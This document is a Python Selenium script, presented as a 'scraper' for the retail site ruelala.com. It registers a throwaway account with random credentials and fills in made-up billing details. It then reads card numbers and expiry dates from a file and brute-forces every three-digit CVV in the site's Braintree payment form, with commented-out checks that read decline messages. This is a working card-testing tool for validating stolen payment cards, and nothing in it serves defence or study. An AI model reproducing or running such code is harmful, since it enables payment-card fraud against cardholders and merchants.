
from selenium import webdriver 
from time import sleep 
from selenium.webdriver.common.by import By 
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from bs4 import BeautifulSoup
import requests
import string, random

letters = string.ascii_letters
letters = ''.join(random.choice(letters) for i in range(10))
num = str(random.randint(1,101))
usr = letters+num+letters+'@mail.ru'
pwd= letters+num+letters
  
cpath = "chromedriver.exe"
driver = webdriver.Chrome(cpath)

capabilities = DesiredCapabilities.CHROME.copy()
capabilities['goog:loggingPrefs'] = {'performance': 'ALL'}

class RuelalaScraper():
    def __init__(self):
        self.base_url = "https://www.ruelala.com/boutique/"
        self.account_url= "https://www.ruelala.com/account/"

    def scrape(self, usr, pwd):
        driver.get(self.base_url)
        print ("Opened ruelala") 
        sleep(3) 
        username_box = driver.find_element_by_id('landing_email') 
        username_box.send_keys(usr) 
        print ("Email Id entered") 
        sleep(3) 
        
        registration_continue_box = driver.find_element_by_id('registration_continue') 
        registration_continue_box.click() 
        sleep(5)
        # logs = driver.get_log('performance')
        # print (logs)
          
        password_box = driver.find_element_by_id('register_password') 
        password_box.send_keys(pwd) 
        print ("Password entered") 
          
        registration_submit_box = driver.find_element_by_id('registration_submit') 
        registration_submit_box.click() 
        print ("Success registering")
        sleep(5)

        driver.execute_script("location.href = 'https://www.ruelala.com/account/'")
        addPay_submit_box = driver.find_element_by_id('add_payment') 
        addPay_submit_box.click()
        sleep(5)

        # closeModalBtn = driver.find_element_by_css_selector("#mat-mobile-wrapper > a")
        # closeModalBtn.click()
        

        
        cardName = "Van"
        firstName = "Alexey"
        lastName = "Dev"
        address = "sa"
        city = "moscow"
        state = "HI"
        zipcode = "96704"
        phoneNum = "1-541-754-3010"
        sleep(3)

        cardName_box = driver.find_element_by_id('cardholder_name') 
        cardName_box.send_keys(cardName) 

        firstName_box = driver.find_element_by_id('first_name') 
        firstName_box.send_keys(firstName) 

        lastName_box = driver.find_element_by_id('last_name') 
        lastName_box.send_keys(lastName) 

        address_box = driver.find_element_by_id('address1') 
        address_box.send_keys(address) 

        city_box = driver.find_element_by_id('city') 
        city_box.send_keys(city) 

        state_box = driver.find_element_by_id('state') 
        state_box.send_keys(state) 

        zipcode_box = driver.find_element_by_id('postalCode') 
        zipcode_box.send_keys(zipcode) 

        phoneNum_box = driver.find_element_by_id('phone') 
        phoneNum_box.send_keys(phoneNum) 
        
        inputFile = open("input.txt", "r")
        for cardDetail in inputFile:
            cardDetail1 = cardDetail.split("|")
            cardNum = cardDetail1[0]
            cardMonth = cardDetail1[1]
            cardYear = cardDetail1[2]

            iframeElementNum = driver.find_element_by_name("braintree-hosted-field-number")
            driver.switch_to.frame(iframeElementNum)
            cardNum_box = driver.find_element_by_name('credit-card-number') 
            driver.execute_script("document.querySelectorAll('input[name=credit-card-number]')[0].value = ''")
            cardNum_box.send_keys(cardNum)
            driver.switch_to.default_content()

            iframeElementMonth = driver.find_element_by_name("braintree-hosted-field-expirationMonth")
            driver.switch_to.frame(iframeElementMonth)
            cardMonth_box = driver.find_element_by_name('expiration-month') 
            driver.execute_script("document.querySelectorAll('input[name=expiration-month]')[0].value = ''")
            cardMonth_box.send_keys(cardMonth)
            driver.switch_to.default_content()

            iframeElementYear = driver.find_element_by_name("braintree-hosted-field-expirationYear")
            driver.switch_to.frame(iframeElementYear)
            cardYear_box = driver.find_element_by_name('expiration-year') 
            driver.execute_script("document.querySelectorAll('input[name=expiration-year]')[0].value = ''")
            cardYear_box.send_keys(cardYear) 
            driver.switch_to.default_content()
            
            for cvv in range(999):
                cardCVV = '{0:03d}'.format(cvv)
                sleep(5)
                iframeElementCVV = driver.find_element_by_name("braintree-hosted-field-cvv")
                driver.switch_to.frame(iframeElementCVV)
                cardCVV_box = driver.find_element_by_name('cvv')
                driver.execute_script("document.querySelectorAll('input[name=cvv]')[0].value = ''")
                cardCVV_box.send_keys(cardCVV)
                driver.switch_to.default_content()

                submitButton = driver.find_element_by_css_selector(".modal-body > .form-actions > button.rue-button")
                submitButton.click()
                sleep(5)

                # if (len(driver.find_element_by_css_selector("ul.form-errors > li.form-error")) > 0):
                #     result = driver.find_element_by_css_selector("ul.form-errors > li.form-error").get_attribute('innerHTML')
                #     print(result)

                #     if (result == "Your billing address did not match the address on file for your credit card.  Please correct your address and try again."):
                #         print("true")
                #         break
                #     if (result == "Sorry, your card was declined. Please contact your bank or try a different card."):
                #         print("false")
                #         continue
                # else:
                #     continue
        
if __name__ == '__main__':
    scraper = RuelalaScraper()
    scraper.scrape(usr, pwd)

input('Press anything to quit') 
driver.quit() 
print("Finished") 
